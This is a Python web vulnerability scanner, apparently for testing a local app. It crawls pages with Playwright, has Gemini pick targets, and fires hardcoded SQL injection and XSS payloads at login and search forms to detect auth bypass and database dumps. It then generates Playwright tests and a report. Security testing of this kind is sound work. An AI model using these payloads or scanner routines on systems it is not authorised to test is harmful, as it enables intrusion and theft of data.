#!/usr/bin/env python3
"""
Smart QA Agent - Intelligent Vulnerability Discovery

This agent:
1. Crawls the target app to discover pages and forms
2. Uses Gemini to identify interesting attack surfaces
3. Runs targeted payloads (SQL injection, XSS, etc.)
4. Analyzes responses for vulnerability indicators
5. Generates Playwright test code for found vulnerabilities
"""

import os
import sys
import json
import asyncio
import functools
import builtins
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
from dotenv import load_dotenv
from playwright.async_api import async_playwright, Browser, Page, ElementHandle

load_dotenv()

# Force unbuffered output
sys.stdout.reconfigure(line_buffering=True)
print = functools.partial(builtins.print, flush=True)

# Config
TARGET_URL = os.getenv("TARGET_URL", "http://localhost:5173")
DEMO_MODE = os.getenv("DEMO_MODE", "false").lower() == "true"
HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"

# API Keys
API_KEYS = []
for i in range(1, 10):
    key_name = f"GOOGLE_API_KEY_{i}" if i > 1 else "GOOGLE_API_KEY"
    key = os.getenv(key_name)
    if key:
        API_KEYS.append(key)

if not API_KEYS:
    raise ValueError("No GOOGLE_API_KEY found in environment!")

print(f"🔑 Loaded {len(API_KEYS)} API key(s)")

API_KEY_INDEX = 0

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT * FROM users --",
    "1' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "') OR ('1'='1",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
]

# Vulnerability indicators in responses
VULN_INDICATORS = {
    "sqli": [
        "sql", "syntax error", "mysql", "postgresql", "sqlite", "oracle",
        "database", "query", "select", "union", "where", "'1'='1'",
        "password", "cleartext", "dump", "users table", "vulnerable"
    ],
    "xss": [
        "<script>", "alert(", "onerror=", "javascript:", "onclick="
    ],
    "error_disclosure": [
        "traceback", "exception", "error:", "stack trace", "debug",
        "internal server error", "undefined", "null pointer"
    ],
    "auth_bypass": [
        "login successful", "welcome admin", "authenticated", "session",
        "token", "role"
    ]
}


@dataclass
class InputField:
    """Represents a discovered input field"""
    selector: str
    element_type: str  # input, textarea, select
    input_type: str    # text, password, email, search, etc.
    name: str
    id: str
    placeholder: str
    label: str
    page_url: str
    
    
@dataclass
class Vulnerability:
    """Represents a discovered vulnerability"""
    id: str
    type: str          # sqli, xss, auth_bypass, etc.
    severity: str      # critical, high, medium, low
    page_url: str
    field: str
    payload: str
    evidence: str
    response_snippet: str
    timestamp: str
    playwright_test: str = ""


class SmartQAAgent:
    """Intelligent QA agent that discovers and tests vulnerabilities"""
    
    def __init__(self, target_url: str = TARGET_URL):
        self.target_url = target_url
        self.browser: Optional[Browser] = None
        self.page: Optional[Page] = None
        self.discovered_pages: List[str] = []
        self.discovered_fields: List[InputField] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.logs: List[str] = []
        
    def log(self, message: str):
        """Log a message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted = f"[{timestamp}] {message}"
        print(formatted)
        self.logs.append(formatted)
        
    async def start(self):
        """Initialize browser"""
        self.log("🚀 Starting Smart QA Agent...")
        playwright = await async_playwright().start()
        self.browser = await playwright.chromium.launch(
            headless=HEADLESS,
            args=['--no-sandbox', '--disable-dev-shm-usage']
        )
        context = await self.browser.new_context()
        self.page = await context.new_page()
        self.log(f"🎯 Target: {self.target_url}")
        
    async def stop(self):
        """Close browser"""
        if self.browser:
            await self.browser.close()
            
    async def discover_pages(self) -> List[str]:
        """Crawl the app to discover all pages"""
        self.log("🔍 Phase 1: Discovering pages...")
        
        await self.page.goto(self.target_url)
        await self.page.wait_for_timeout(1000)
        
        # Find all navigation links
        links = await self.page.query_selector_all('a[href]')
        pages = set([self.target_url])
        
        for link in links:
            try:
                href = await link.get_attribute('href')
                if href and not href.startswith('#') and not href.startswith('http'):
                    # Relative URL
                    full_url = f"{self.target_url.rstrip('/')}/{href.lstrip('/')}"
                    pages.add(full_url)
                elif href and href.startswith(self.target_url):
                    pages.add(href)
            except:
                continue
                
        self.discovered_pages = list(pages)
        self.log(f"📄 Found {len(self.discovered_pages)} pages:")
        for p in self.discovered_pages:
            self.log(f"   - {p}")
            
        return self.discovered_pages
        
    async def discover_input_fields(self) -> List[InputField]:
        """Find all input fields across discovered pages"""
        self.log("🔍 Phase 2: Discovering input fields...")
        
        all_fields = []
        
        for page_url in self.discovered_pages:
            try:
                await self.page.goto(page_url)
                await self.page.wait_for_timeout(500)
                
                # Find all form inputs
                inputs = await self.page.query_selector_all('input, textarea, select')
                
                for inp in inputs:
                    try:
                        if not await inp.is_visible():
                            continue
                            
                        tag = await inp.evaluate("e => e.tagName.toLowerCase()")
                        input_type = await inp.get_attribute('type') or 'text'
                        name = await inp.get_attribute('name') or ''
                        id_ = await inp.get_attribute('id') or ''
                        placeholder = await inp.get_attribute('placeholder') or ''
                        
                        # Try to find label
                        label = ''
                        if id_:
                            label_el = await self.page.query_selector(f'label[for="{id_}"]')
                            if label_el:
                                label = await label_el.inner_text()
                                
                        # Skip hidden/submit/button types
                        if input_type in ['hidden', 'submit', 'button', 'reset']:
                            continue
                            
                        # Generate selector
                        if id_:
                            selector = f'#{id_}'
                        elif name:
                            selector = f'{tag}[name="{name}"]'
                        else:
                            selector = f'{tag}[placeholder="{placeholder}"]' if placeholder else tag
                            
                        field = InputField(
                            selector=selector,
                            element_type=tag,
                            input_type=input_type,
                            name=name,
                            id=id_,
                            placeholder=placeholder,
                            label=label,
                            page_url=page_url
                        )
                        all_fields.append(field)
                        
                    except Exception as e:
                        continue
                        
            except Exception as e:
                self.log(f"⚠️ Error crawling {page_url}: {e}")
                
        self.discovered_fields = all_fields
        self.log(f"📝 Found {len(self.discovered_fields)} input fields:")
        for f in self.discovered_fields:
            self.log(f"   - {f.page_url}: {f.selector} ({f.input_type}) - '{f.placeholder or f.label or f.name}'")
            
        return self.discovered_fields
        
    async def analyze_field_with_gemini(self, field: InputField) -> Dict[str, Any]:
        """Use Gemini to analyze a field for potential vulnerabilities"""
        global API_KEY_INDEX
        
        try:
            from langchain_google_genai import ChatGoogleGenerativeAI
            
            api_key = API_KEYS[API_KEY_INDEX % len(API_KEYS)]
            API_KEY_INDEX += 1
            
            model = ChatGoogleGenerativeAI(
                model="gemini-2.0-flash-exp",
                api_key=api_key,
                temperature=0.0
            )
            
            prompt = f"""
            Analyze this web form input field for potential security vulnerabilities:
            
            Page URL: {field.page_url}
            Field Type: {field.element_type} ({field.input_type})
            Name: {field.name}
            ID: {field.id}
            Placeholder: {field.placeholder}
            Label: {field.label}
            
            Based on this information:
            1. What type of data is this field likely accepting?
            2. What vulnerabilities should we test for? (SQL injection, XSS, etc.)
            3. What specific payloads would be most effective?
            4. What response indicators would confirm a vulnerability?
            
            Return JSON:
            {{
                "field_purpose": "login/search/comment/etc",
                "risk_level": "high/medium/low",
                "test_types": ["sqli", "xss"],
                "recommended_payloads": ["payload1", "payload2"],
                "success_indicators": ["indicator1", "indicator2"],
                "reasoning": "brief explanation"
            }}
            """
            
            response = await model.ainvoke(prompt)
            content = str(response.content).replace("```json", "").replace("```", "").strip()
            
            if "{" in content:
                content = content[content.find("{"):content.rfind("}")+1]
                return json.loads(content)
                
        except Exception as e:
            self.log(f"⚠️ Gemini analysis failed: {e}")
            
        # Fallback analysis based on field properties
        return {
            "field_purpose": "unknown",
            "risk_level": "medium",
            "test_types": ["sqli", "xss"],
            "recommended_payloads": SQLI_PAYLOADS[:3] + XSS_PAYLOADS[:2],
            "success_indicators": VULN_INDICATORS["sqli"][:5],
            "reasoning": "Default analysis"
        }
        
    async def test_field_for_sqli(self, field: InputField) -> List[Vulnerability]:
        """Test a specific field for SQL injection"""
        vulnerabilities = []
        
        self.log(f"💉 Testing {field.selector} on {field.page_url} for SQLi...")
        
        for payload in SQLI_PAYLOADS[:4]:  # Test first 4 payloads
            try:
                await self.page.goto(field.page_url)
                await self.page.wait_for_timeout(500)
                
                # Find and fill the input
                element = await self.page.query_selector(field.selector)
                if not element:
                    # Try alternative selectors
                    if field.id:
                        element = await self.page.query_selector(f'#{field.id}')
                    if not element and field.name:
                        element = await self.page.query_selector(f'[name="{field.name}"]')
                    if not element and field.placeholder:
                        element = await self.page.query_selector(f'[placeholder="{field.placeholder}"]')
                        
                if not element:
                    self.log(f"   ⚠️ Could not find element {field.selector}")
                    continue
                    
                await element.fill(payload)
                self.log(f"   📝 Filled with: {payload}")
                
                # Submit the form (try Enter key first, then look for submit button)
                await element.press('Enter')
                await self.page.wait_for_timeout(1500)
                
                # Check response for vulnerability indicators
                page_content = await self.page.content()
                page_text = page_content.lower()
                
                # Look for SQLi indicators
                found_indicators = []
                for indicator in VULN_INDICATORS["sqli"]:
                    if indicator.lower() in page_text:
                        found_indicators.append(indicator)
                        
                if found_indicators:
                    self.log(f"   🚨 VULNERABILITY FOUND! Indicators: {found_indicators}")
                    
                    # Take screenshot
                    screenshot_path = f"qa_screenshots/sqli_{field.name or field.id}_{datetime.now().strftime('%H%M%S')}.png"
                    await self.page.screenshot(path=screenshot_path)
                    
                    # Determine severity
                    severity = "critical" if any(i in found_indicators for i in ["password", "dump", "users"]) else "high"
                    
                    vuln = Vulnerability(
                        id=f"SQLI-{len(self.vulnerabilities)+1:03d}",
                        type="sqli",
                        severity=severity,
                        page_url=field.page_url,
                        field=field.selector,
                        payload=payload,
                        evidence=f"Indicators found: {', '.join(found_indicators)}",
                        response_snippet=page_text[:500],
                        timestamp=datetime.now().isoformat(),
                        playwright_test=self._generate_playwright_test(field, payload, "sqli")
                    )
                    vulnerabilities.append(vuln)
                    self.vulnerabilities.append(vuln)
                    
                    # In demo mode, stop after first successful SQLi
                    if DEMO_MODE:
                        self.log("   🎯 Demo mode: Found SQLi, moving to next field")
                        break
                        
            except Exception as e:
                self.log(f"   ⚠️ Error testing payload: {e}")
                
        return vulnerabilities
        
    async def test_login_page(self) -> List[Vulnerability]:
        """Specifically test the login page for SQL injection"""
        self.log("🔐 Testing Login Page for SQL Injection...")
        vulnerabilities = []
        
        login_url = f"{self.target_url}/login"
        
        try:
            await self.page.goto(login_url)
            await self.page.wait_for_timeout(1000)
            
            # Find username and password fields
            username_field = await self.page.query_selector('#username, [name="username"], input[type="text"]')
            password_field = await self.page.query_selector('#password, [name="password"], input[type="password"]')
            
            if not username_field:
                self.log("   ⚠️ Could not find username field")
                return vulnerabilities
                
            for payload in SQLI_PAYLOADS[:3]:
                try:
                    await self.page.goto(login_url)
                    await self.page.wait_for_timeout(500)
                    
                    username_field = await self.page.query_selector('#username, [name="username"], input[type="text"]')
                    password_field = await self.page.query_selector('#password, [name="password"], input[type="password"]')
                    
                    await username_field.fill(payload)
                    if password_field:
                        await password_field.fill("anything")
                        
                    self.log(f"   📝 Testing: {payload}")
                    
                    # Submit form
                    submit_btn = await self.page.query_selector('button[type="submit"], .login-button, button')
                    if submit_btn:
                        await submit_btn.click()
                    else:
                        await username_field.press('Enter')
                        
                    await self.page.wait_for_timeout(1500)
                    
                    # Check for auth bypass
                    page_text = (await self.page.content()).lower()
                    
                    if any(ind in page_text for ind in ["login successful", "welcome", "authenticated"]):
                        self.log("   🚨 AUTH BYPASS FOUND!")
                        
                        screenshot_path = f"qa_screenshots/auth_bypass_{datetime.now().strftime('%H%M%S')}.png"
                        await self.page.screenshot(path=screenshot_path)
                        
                        vuln = Vulnerability(
                            id=f"AUTH-{len(self.vulnerabilities)+1:03d}",
                            type="auth_bypass",
                            severity="critical",
                            page_url=login_url,
                            field="#username",
                            payload=payload,
                            evidence="SQL injection allows authentication bypass",
                            response_snippet=page_text[:500],
                            timestamp=datetime.now().isoformat(),
                            playwright_test=self._generate_login_test(payload)
                        )
                        vulnerabilities.append(vuln)
                        self.vulnerabilities.append(vuln)
                        
                        if DEMO_MODE:
                            break
                            
                except Exception as e:
                    self.log(f"   ⚠️ Error: {e}")
                    
        except Exception as e:
            self.log(f"   ⚠️ Error testing login: {e}")
            
        return vulnerabilities
        
    async def test_user_search(self) -> List[Vulnerability]:
        """Specifically test the user search page for SQL injection"""
        self.log("🔍 Testing User Search for SQL Injection...")
        vulnerabilities = []
        
        users_url = f"{self.target_url}/users"
        
        try:
            await self.page.goto(users_url)
            await self.page.wait_for_timeout(1000)
            
            # Find search input
            search_field = await self.page.query_selector(
                '.search-input, input[placeholder*="search"], input[placeholder*="username"], input[type="text"]'
            )
            
            if not search_field:
                self.log("   ⚠️ Could not find search field")
                return vulnerabilities
                
            for payload in SQLI_PAYLOADS[:4]:
                try:
                    await self.page.goto(users_url)
                    await self.page.wait_for_timeout(500)
                    
                    search_field = await self.page.query_selector(
                        '.search-input, input[placeholder*="search"], input[placeholder*="username"], input[type="text"]'
                    )
                    
                    await search_field.fill(payload)
                    self.log(f"   📝 Testing: {payload}")
                    
                    # Submit search
                    await search_field.press('Enter')
                    await self.page.wait_for_timeout(2000)
                    
                    # Check for database dump
                    page_text = (await self.page.content()).lower()
                    
                    # Look for indicators of successful SQLi
                    indicators_found = []
                    if "users table" in page_text or "records" in page_text:
                        indicators_found.append("database dump")
                    if "password" in page_text and ("cleartext" in page_text or "admin" in page_text):
                        indicators_found.append("password disclosure")
                    if "api_keys" in page_text or "sessions" in page_text:
                        indicators_found.append("sensitive data")
                    if "vulnerable" in page_text:
                        indicators_found.append("vulnerability confirmed")
                    if "'1'='1'" in page_text or "union" in page_text:
                        indicators_found.append("SQL syntax visible")
                        
                    if indicators_found:
                        self.log(f"   🚨 SQL INJECTION FOUND! {indicators_found}")
                        
                        screenshot_path = f"qa_screenshots/sqli_search_{datetime.now().strftime('%H%M%S')}.png"
                        await self.page.screenshot(path=screenshot_path)
                        
                        vuln = Vulnerability(
                            id=f"SQLI-{len(self.vulnerabilities)+1:03d}",
                            type="sqli",
                            severity="critical",
                            page_url=users_url,
                            field=".search-input",
                            payload=payload,
                            evidence=f"Database dump achieved: {', '.join(indicators_found)}",
                            response_snippet=page_text[:1000],
                            timestamp=datetime.now().isoformat(),
                            playwright_test=self._generate_search_test(payload)
                        )
                        vulnerabilities.append(vuln)
                        self.vulnerabilities.append(vuln)
                        
                        if DEMO_MODE:
                            self.log("   🎯 Demo mode: Critical SQLi found, stopping")
                            break
                            
                except Exception as e:
                    self.log(f"   ⚠️ Error: {e}")
                    
        except Exception as e:
            self.log(f"   ⚠️ Error testing user search: {e}")
            
        return vulnerabilities
        
    def _generate_playwright_test(self, field: InputField, payload: str, vuln_type: str) -> str:
        """Generate Playwright test code for a vulnerability"""
        return f'''
# Playwright test for {vuln_type.upper()} vulnerability
# Generated by Smart QA Agent on {datetime.now().isoformat()}

import asyncio
from playwright.async_api import async_playwright

async def test_{vuln_type}_{field.name or 'field'}():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        # Navigate to vulnerable page
        await page.goto("{field.page_url}")
        await page.wait_for_timeout(500)
        
        # Fill vulnerable field with payload
        field = await page.query_selector("{field.selector}")
        await field.fill("{payload}")
        
        # Submit
        await field.press("Enter")
        await page.wait_for_timeout(1500)
        
        # Verify vulnerability
        content = await page.content()
        assert any(ind in content.lower() for ind in {VULN_INDICATORS[vuln_type][:5]}), "Vulnerability not confirmed"
        
        print("✅ Vulnerability confirmed!")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(test_{vuln_type}_{field.name or 'field'}())
'''

    def _generate_login_test(self, payload: str) -> str:
        """Generate Playwright test for login SQLi"""
        return f'''
# Playwright test for Login SQL Injection (Auth Bypass)
# Generated by Smart QA Agent on {datetime.now().isoformat()}

import asyncio
from playwright.async_api import async_playwright

async def test_login_sqli():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        await page.goto("{self.target_url}/login")
        await page.wait_for_timeout(500)
        
        # SQL injection in username field
        await page.fill("#username", "{payload}")
        await page.fill("#password", "anything")
        
        # Submit login
        await page.click("button[type='submit'], .login-button")
        await page.wait_for_timeout(1500)
        
        # Check for successful auth bypass
        content = await page.content()
        assert "login successful" in content.lower() or "welcome" in content.lower()
        
        print("✅ Auth bypass confirmed!")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(test_login_sqli())
'''

    def _generate_search_test(self, payload: str) -> str:
        """Generate Playwright test for search SQLi"""
        return f'''
# Playwright test for User Search SQL Injection (Database Dump)
# Generated by Smart QA Agent on {datetime.now().isoformat()}

import asyncio
from playwright.async_api import async_playwright

async def test_search_sqli():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        await page.goto("{self.target_url}/users")
        await page.wait_for_timeout(500)
        
        # SQL injection in search field
        search = await page.query_selector(".search-input, input[placeholder*='search'], input[type='text']")
        await search.fill("{payload}")
        await search.press("Enter")
        await page.wait_for_timeout(2000)
        
        # Screenshot evidence
        await page.screenshot(path="sqli_evidence.png")
        
        # Verify database dump
        content = await page.content()
        assert "password" in content.lower() or "users table" in content.lower()
        
        print("✅ Database dump confirmed!")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(test_search_sqli())
'''

    async def analyze_results_with_gemini(self) -> Dict[str, Any]:
        """Use Gemini to analyze all findings and generate report"""
        global API_KEY_INDEX
        
        if not self.vulnerabilities:
            return {"summary": "No vulnerabilities found", "recommendations": []}
            
        try:
            from langchain_google_genai import ChatGoogleGenerativeAI
            
            api_key = API_KEYS[API_KEY_INDEX % len(API_KEYS)]
            API_KEY_INDEX += 1
            
            model = ChatGoogleGenerativeAI(
                model="gemini-2.0-flash-exp",
                api_key=api_key,
                temperature=0.2
            )
            
            vuln_summary = "\n".join([
                f"- {v.type.upper()} ({v.severity}): {v.evidence}"
                for v in self.vulnerabilities
            ])
            
            prompt = f"""
            Analyze these security vulnerabilities found by automated testing:
            
            Target: {self.target_url}
            
            Vulnerabilities Found:
            {vuln_summary}
            
            Provide:
            1. Executive summary (2-3 sentences for C-level)
            2. Risk assessment (overall risk level and business impact)
            3. Top 3 remediation priorities
            4. Comparison to industry standards (OWASP Top 10)
            
            Return JSON:
            {{
                "executive_summary": "...",
                "risk_level": "critical/high/medium/low",
                "business_impact": "...",
                "remediation_priorities": ["fix1", "fix2", "fix3"],
                "owasp_mapping": ["A01:2021", "A03:2021"],
                "estimated_fix_time": "X hours/days"
            }}
            """
            
            response = await model.ainvoke(prompt)
            content = str(response.content).replace("```json", "").replace("```", "").strip()
            
            if "{" in content:
                content = content[content.find("{"):content.rfind("}")+1]
                return json.loads(content)
                
        except Exception as e:
            self.log(f"⚠️ Gemini analysis failed: {e}")
            
        return {
            "executive_summary": f"Found {len(self.vulnerabilities)} vulnerabilities requiring immediate attention.",
            "risk_level": "critical" if any(v.severity == "critical" for v in self.vulnerabilities) else "high",
            "business_impact": "Potential data breach and unauthorized access",
            "remediation_priorities": ["Fix SQL injection", "Implement input validation", "Add parameterized queries"],
            "owasp_mapping": ["A03:2021 - Injection"],
            "estimated_fix_time": "2-4 hours"
        }
        
    def save_results(self):
        """Save all results to files"""
        # Ensure directories exist
        Path("qa_screenshots").mkdir(exist_ok=True)
        Path("qa_reports").mkdir(exist_ok=True)
        
        # Save vulnerabilities as JSON
        results = {
            "target_url": self.target_url,
            "scan_time": datetime.now().isoformat(),
            "pages_scanned": len(self.discovered_pages),
            "fields_tested": len(self.discovered_fields),
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities],
            "logs": self.logs
        }
        
        with open("qa_results.json", "w") as f:
            json.dump(results, f, indent=2)
            
        # Save generated Playwright tests
        if self.vulnerabilities:
            tests_content = "# Auto-generated Playwright Tests for Found Vulnerabilities\n\n"
            for v in self.vulnerabilities:
                if v.playwright_test:
                    tests_content += f"\n# {'='*58}\n# {v.id}: {v.type.upper()} on {v.page_url}\n# {'='*58}\n"
                    tests_content += v.playwright_test
                    
            with open("qa_reports/generated_tests.py", "w") as f:
                f.write(tests_content)
                
        self.log(f"💾 Results saved to qa_results.json and qa_reports/generated_tests.py")
        
    async def run(self):
        """Main entry point - run the full scan"""
        try:
            await self.start()
            
            # Phase 1: Discover pages
            await self.discover_pages()
            
            # Phase 2: Discover input fields
            await self.discover_input_fields()
            
            # Phase 3: Test specific high-value targets
            self.log("💉 Phase 3: Testing for vulnerabilities...")
            
            # Test login page specifically
            await self.test_login_page()
            
            # Test user search specifically  
            await self.test_user_search()
            
            # Phase 4: Analyze results with Gemini
            self.log("🤖 Phase 4: AI Analysis of findings...")
            analysis = await self.analyze_results_with_gemini()
            
            # Phase 5: Generate report
            self.log("📊 Phase 5: Generating report...")
            self.save_results()
            
            # Print summary
            print("\n" + "="*60)
            print("  SMART QA AGENT - SCAN COMPLETE")
            print("="*60)
            print(f"\n📊 Results:")
            print(f"   Pages scanned: {len(self.discovered_pages)}")
            print(f"   Fields tested: {len(self.discovered_fields)}")
            print(f"   Vulnerabilities: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                print(f"\n🚨 Vulnerabilities Found:")
                for v in self.vulnerabilities:
                    print(f"   [{v.severity.upper()}] {v.id}: {v.type} on {v.page_url}")
                    print(f"      Payload: {v.payload}")
                    print(f"      Evidence: {v.evidence[:100]}...")
                    
            if analysis:
                print(f"\n📋 Executive Summary:")
                print(f"   {analysis.get('executive_summary', 'N/A')}")
                print(f"   Risk Level: {analysis.get('risk_level', 'N/A')}")
                
            print("\n" + "="*60)
            
        finally:
            await self.stop()
            

async def main():
    agent = SmartQAAgent()
    await agent.run()
    
    
if __name__ == "__main__":
    import sys
    # Suppress asyncio cleanup warning on Python 3.12+
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ Scan interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)
